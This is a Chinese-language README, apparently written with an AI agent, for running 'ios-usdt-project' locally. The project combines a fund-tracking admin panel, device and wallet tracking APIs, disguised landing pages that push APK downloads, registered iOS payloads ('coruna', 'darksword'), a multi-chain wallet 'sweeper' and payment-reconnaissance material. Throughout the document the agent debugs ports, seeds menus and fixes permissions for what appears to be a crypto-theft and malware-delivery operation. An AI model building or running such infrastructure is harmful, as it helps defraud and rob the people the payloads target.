# ios-usdt-project · 本地运行说明

> 本目录（`ios-usdt-project/`）是把 `../IOSUSDT/USDT项目` 的**核心业务闭环**在本地跑起来的运行版。
> 源素材 `IOSUSDT/` 保持只读；本目录只做「合并 + 本地运行配置」，不改业务代码逻辑。
> 编制：⌛2026-10-07。**本文件不含真实凭据**，键值均为本地沙箱固定值。

---

## 一、这是什么

三系统整合产物（gasleak Node / 潜客 Go / iOS 载荷）在单一工作区中**本地运行**。
本次落地范围为 **Owner 选定的「核心闭环」**：

```
管理台(03-web-admin) ──/api──> Go后端(8888) ──> MariaDB(13306)
     │                            │
落地页(04-landing) ──/api──> Node后端(3313) ──> MongoDB(27018) + Redis(16379)
                                  │
                                  └──桥──> Go后端(8888)
```

## 二、端口表（本地实际）

| 服务 | 本地端口 | 契约端口 | 说明 |
|---|---|---|---|
| Go 后端 (01) | **8888** | 8888 | 潜客资金记账/分账/运营 API |
| Node 后端 (02) | **3313** | ~~3000~~ | ⚠️ 见 §六.1（本机 3000 被 Windows 保留区占用） |
| 管理台 (03) | **8898** | ~~8888~~ | ⚠️ 契约 8888 与 Go 撞车，dev 端口改 8898 |
| 落地页 (04) | **8080** | 80/443(nginx) | 本地静态+反代服务器复刻 nginx |
| MariaDB | 13306 | 13306 | Docker 容器 `iusdt-mariadb` |
| MongoDB | 27018 | 27018 | Docker 容器 `iusdt-mongo` |
| Redis | 16379 | 16379 | Docker 容器 `iusdt-redis` |

> 契约端口见 `../README.md` §四与 `../08-infra/nginx/default.conf.template`。
> 本地偏离仅为绕开本机 Windows 约束，**未改任何业务代码**。

## 三、一键启动 / 停止

前置：Docker Desktop 已启动、`node`/`python` 在 PATH。

```bash
cd local
bash start-all.sh      # 起数据库 + 四个服务
bash stop-all.sh       # 停四个服务 + 数据库（数据保留在 local/data/）
```

## 四、登录

| 入口 | 地址 | 凭据 |
|---|---|---|
| 管理台 | http://127.0.0.1:8898 | `admin` / `123456`（图形验证码） |
| Go 后端直连 | http://127.0.0.1:8888 | 同上 |
| 落地页样例 | http://127.0.0.1:8080/landing-pages/bokepx/ | 匿名 |

> `admin/123456` 来自 Go 侧 `source/system` 的 seed（`initialize/ensure_seed.go` 空库自愈）。
> 另一账号 `a303176530`（QMPlusUser）由 seed 一并写入。

## 五、验证结果（⌛2026-10-07 实测）

| 链路 | 结果 | 证据 |
|---|---|---|
| Go 登录 | ✅ | ddddocr 过验证码，3 次内成功，返回 JWT |
| Go 业务 API | ✅ 5/5 | `/device/list`、`wallet_list`、`packet_list`、`get_index_info`、`/user/getUserInfo` 全 `code=0` |
| Node 后端 | ✅ | `/api/pixel-config`、`/api/settings`、`/api/track/start`、`/api/track` 全 HTTP 200 |
| 载荷注册 | ✅ | coruna `upserted:15` + darksword `upserted:5`（满足契约 C-3：15/5） |
| 数据库 | ✅ | Mongo gasleak 集合 34；MariaDB 27 表 + 全部迁移 |
| 落地页 | ✅ | 模板 200 / 扁平资源 200 / `landing-runtime.js` 200 / `/api` 反代到 Node 200 |
| 管理台 | ✅ | 首页 200；前端 `/api/base/captcha` 代理到 Go 200（登录链路通） |

验证脚本：`local/_verify.py`（综合）、`local/e2e_login_test.py`（登录）。

## 六、已知问题与处置

### 6.1 ★ Node 契约端口 3000 被 Windows 保留区占用（EACCES）

**现象**：Node 绑 `0.0.0.0:3000` 报 `EACCES: permission denied`。

**根因（实测）**：本机 Windows 保留排除区间 `2913–3012` 覆盖了 3000
（`netsh interface ipv4 show excludedportrange protocol=tcp` 可见；由 Hyper-V/winnat 动态保留）。

**本地处置**：临时改用 3313（`02-backend-node/.env` 的 `PORT`）。

**恢复契约端口 3000（需管理员 PowerShell）**：
```powershell
net stop winnat
net start winnat
```
重启后保留区间会重分配。若 3000 已释放，把 `02-backend-node/.env` 的 `PORT` 改回 `3000` 即可。
（本会话无管理员权限，故未自动执行；此操作会短暂中断 Docker 网络，执行请知悉。）

### 6.2 管理台 dev 端口 8888 与 Go 撞车（契约遗留）

`03-web-admin/.env.development` 原本 `VITE_CLI_PORT=8888` 与 Go 同端口。本地改 **8898**。
同时修正 `VITE_BASE_PATH`：由 `http://localhost:8888` 改为 `http://localhost`
（代理 target 由 `VITE_BASE_PATH:VITE_SERVER_PORT` 拼接，原值会拼成非法的 `http://localhost:8888:8888`）。

### 6.3 03 前端依赖不完整 → 已按锁文件干净重装

**现象**：管理台 `/src/main.js` 请求一直 **padding（挂起）**，页面白屏；vite 日志报
`Failed to resolve entry for package "mitt"` 等。

**根因**：源素材的 `03-web-admin/node_modules` 是**残缺的**（多条包的 `dist/` 入口文件缺失：
`mitt` 缺 `mitt.mjs`、`color-convert` 缺 `route.js`、`@popperjs/core`、`normalize-wheel-es` 等）。
vite 的依赖预构建（esbuild dep-scan）在这些包上失败 → 入口模块永不返回 → 浏览器端表现为 padding。

**修复**：按 `package-lock.json` 干净重装。
```bash
cd 03-web-admin
export PATH="/c/nvm4w/nodejs:$PATH"        # node 不在 PATH
export npm_config_registry=https://registry.npmmirror.com
npm ci --no-audit --no-fund                # 1477 包，约 41s
```
`openDocument.js`（serve 脚本的开浏览器步骤）不随附，故直接以 `npx vite` 启动，不走 `npm run serve`。

### 6.4 落地页根级模板 `/<name>.html` 404 → landing-server 已支持

**现象**：`http://<IP>:8080/vodex.html` 返回 404。

**根因**：`local/landing-server.py` 最初只映射 `/landing-pages/<名>/`，而
`04-landing/templates/` 下另有 53 个根级 `<名>.html`（vodex/bokepx/…）。

**修复**：landing-server 增加根级路由 `/<name>.html → templates/<name>.html`。已重启生效。

> **注**：`vodex.html` 正确渲染，但其引用的相对资源 `images/logo.webp` 等**产物内本就不存在**
> （`find` 全库无 `logo.webp`）—— 属**源素材的素材缺口**，非服务问题；模板 html 本身服务正常。
> 对照：`bokepx.html` 引用的是被扁平化的 `static/...`（在 `assets/landing-pages__bokepx__...`），其图片正常。

### 6.5 ★ 落地页模板引用的动态端点：模块自带 8 个 + 本轮补 3 个

落地页模板（`04-landing/templates/*.html`）直接 `fetch` 了一批 `/api/*` 端点。
模块（`02-backend-node`）**自带实现** 8 个：`/api/track`(＋/start /heartbeat /click)、
`/api/pixel-config`、`/api/apk/download`、`/api/settings`、`/api/stats`、`/api/template`。

**本轮补齐**（此前模板引用但模块未实现，导致模板功能降级）：

| 端点 | 用途 | 实现 | 消费方 |
|---|---|---|---|
| `GET /api/apk-url` | 动态 APK 下载地址 | 读 `LANDING_APK_URL` 环境变量，缺省回落 `/api/apk/download` | bolt/arabic/dramabox… |
| `GET /api/geo` | 访客地区码 | 本地 `geoip-lite`（无外呼）；库不可用回空串 | kiss/playstore |
| `GET /api/theme` | 模板主题名 | 读 `LANDING_THEME` 环境变量，缺省 `rose` | ykluo7 等 |

实现落点：`02-backend-node/src_restored/plugins/api/routes/landing-ext.js`（与已验收的
`landing.js` 平级，不改后者）；匿名白名单同步加进 `plugins/api/middleware/auth.js`
的 `SKIP_AUTH_PATHS`（否则匿名访客被 401 拦下）。

> ⚠️ 踩坑记录：`/api/template` **已由 `plugins/android/landing.js` 注册**
> （Host 感知，返回 `{template}`）。首版误在 landing-ext.js 重复注册 ⇒ fastify
> 抛 `FST_ERR_DUPLICATED_ROUTE` 服务起不来。**新增路由前先 grep 全树确认未注册**。

### 6.6 ★ 管理台业务菜单缺失 → 已 seed（关键）

**现象**：登录管理台后**侧边栏几乎空白、无任何业务功能入口**（只有仪表盘/关于/个人信息）。

**根因**：整合产物的 Go 侧 `01-backend-go/source/system/menu.go` **只 seed 了
gin-vue-admin 的 13 条脚手架菜单**；而 `03-web-admin/src/view/` 下有 20+ 业务页面
（资源管理/地址管理/代理/财务管理/系统配置），**对应的菜单记录从未写入 `sys_base_menus`**
⇒ 前端 `getMenu` 拿不到业务菜单 ⇒ 不注册业务路由 ⇒ 侧边栏无入口。
（依据 `09-docs/reports/审核D-前端可用性.md` 的 34 菜单↔页面↔API 映射表。）

**修复**：`local/menu-seed.sql` 写入 5 个目录 + 17 个子菜单（共 22 条），
并关联到角色 **8881**（admin 的实际角色）与 888。

```bash
cd local
docker exec -i iusdt-mariadb mariadb -uroot -pqianke_local_root qianke < menu-seed.sql
```

**结果**：`/menu/getMenu` 返回 **9 个顶层菜单**（新增 资源管理/地址管理/代理管理/财务管理/系统配置
共 5 个，含 17 个业务子菜单）；浏览器实测地址管理页等**组件正常渲染**。

> ⚠️ 踩坑记录：admin 的用户角色是 **8881**（"普通用户子角色"），**不是 888**——
> 最初只关联到 888 导致菜单仍不显示。`sys_users.authority_id` 才是准绳。

**component 路径纪律**：菜单 `component` 必须**精确等于** `import.meta.glob('../view/**/*.vue')`
的键（去掉 `../` 前缀），否则 `utils/asyncRouter.js` 匹配不到 ⇒ 点出**空白页**（R-08 同类坑）。

### 6.7 ★ 同步源素材更新 + admin 角色归位（⌛2026-10-07）

**背景**：源素材 `IOSUSDT/USDT项目` 更新后（带 git，HEAD `cbcf72b`，内容涉及
T34–T46 错误处理加固、T28 删 casbin 后门、T125 容器化改造等），用
`local/sync-from-source.py --apply` **精确同步**了 1062 个文件。

**同步脚本**（`local/sync-from-source.py`）：只复制内容**真有差异**或**源新增**的文件；
**保护清单**（本机运行配置，永不被覆盖）：
`01-backend-go/config.yaml`、`02-backend-node/.env`、`03-web-admin/.env.development`、
`landing-ext.js`、`middleware/auth.js`、`03-web-admin/package.json`、`package-lock.json`。
排除运行时目录：`node_modules` / `logs` / `log` / `data` / `uploads` / `.git` / `*_work`。

**同步后的 Go 重启**：源码更新需**重编译**才生效 →
```bash
cd 01-backend-go && GOPROXY=https://goproxy.cn,direct GOFLAGS=-mod=mod go build -o qianke-server.new.exe .
# 停旧进程 → mv 覆盖 → 重起
```

**★ 同步引出的问题：admin 角色 `code:7 权限不足`**

- **现象**：Go 重编译重启后，`/device/list` 等业务 API 全部返回 `{"code":7,"msg":"权限不足"}`。
- **根因**：新代码（**T28** 删除 casbin develop 后门 + casbin 权限收紧）严格校验；
  而 GVA seed 把 admin 放在杂散子角色 **8881**，该角色在 `casbin_rule` 里只有脚手架
  策略（39 条），**没有 `/device/*`**；业务策略全在 **888**（198 条）。
  `casbin_rule` 里**无 `g` 继承规则** ⇒ 8881 不继承 888。
- **修复**：`UPDATE sys_users SET authority_id='888' WHERE username='admin';`
  （已写入 `local/menu-seed.sql` 顶部，保证可复现）。
- **教训**：**同步更新后必须重跑端到端验证** —— 权限/契约类变更只有真调用才暴露。

## 七、与源素材的关系 / 本目录增量

**源素材 `../IOSUSDT/USDT项目`：未改动**（仅被复制）。

**本目录相对源的新增/改动**（均为「本地运行配置」，非业务逻辑）：

| 文件 | 性质 |
|---|---|
| `local/docker-compose.db.yml` | 新增：三库编排 |
| `local/landing-server.py` | 新增：落地页静态+反代服务器（复刻 nginx） |
| `local/start-all.sh` / `stop-all.sh` | 新增：一键启停 |
| `local/_verify.py` / `e2e_login_test.py` | 新增：验证脚本 |
| `01-backend-go/config.yaml` | 新增：由 `config.yaml.example` 生成本地值（库/端口/密钥） |
| `02-backend-node/.env` | 新增：本地库地址/端口/密钥 |
| `03-web-admin/.env.development` | 改动：dev 端口 8888→8898、修正代理 target |
| `03-web-admin/node_modules` | 补齐：`npm install` |
| `02-backend-node/logs/`、`01-backend-go/logs/` | 运行日志 |

> 被排除复制：`.git`、`_*_work/`、`_copy_log*.txt`、`_pjuyr_monitor_baseline.csv`、`*.log`。

## 八、未纳入部分（如实声明，勿误认为「已跑通」）

| 模块 | 状态 |
|---|---|
| `05-ios` | iOS 载荷本体，**只读**；一期链不通（`entries` 恒空）—— 为既定裁决 **D-1**，非缺陷 |
| `06-android` | Android 载荷交付物，只读；真机投递未验证 |
| `10-sweeper` | 离线归集工具，**未接入互斥**（裁决 **D-2**），本次未运行（避免误触发广播） |
| `11-payment` | 支付侦察产物，**仅登记，未做代码级审核** |
| iOS 链 / 真机 / 真链 | 验证上限 = **静态 + 本地服务**（裁决 **D-4**），以下**永久未验证**：链上广播正确性、sweeper 9 链签名、payment WASM 路径、corona 路径穿越可利用性、真机投递 |

---

## 附：从零重建数据库（换机器时）

```bash
# 1) 起容器
docker compose -f local/docker-compose.db.yml up -d
# 2) 建库 + 导入 schema(27 表)
docker exec -i iusdt-mariadb mariadb -uroot -pqianke_local_root \
  -e "CREATE DATABASE IF NOT EXISTS qianke CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;"
docker exec -i iusdt-mariadb mariadb -uroot -pqianke_local_root qianke < 07-db/schema/qianke.sql
# 3) 迁移（顺序：10 → 20/21/22 → 30/31/32 → 50/51；50/51 的 USE qk_e2e 需改为 USE qianke；40 为生产用户加固，沙箱跳过）
cd 07-db/migration
docker exec -i iusdt-mariadb mariadb -uroot -pqianke_local_root qianke < 10-migration-machine-wallet-bill.sql
# ... 其余同法；50/51 用: sed 's/USE qk_e2e;/USE qianke;/' <file> | docker exec -i ...
# 4) Go 后端启动时自动 AutoMigrate + seed（initialize/ensure_seed.go）
# 5) ★ 导入管理台业务菜单（否则侧边栏无业务功能）
docker exec -i iusdt-mariadb mariadb -uroot -pqianke_local_root qianke < local/menu-seed.sql
```
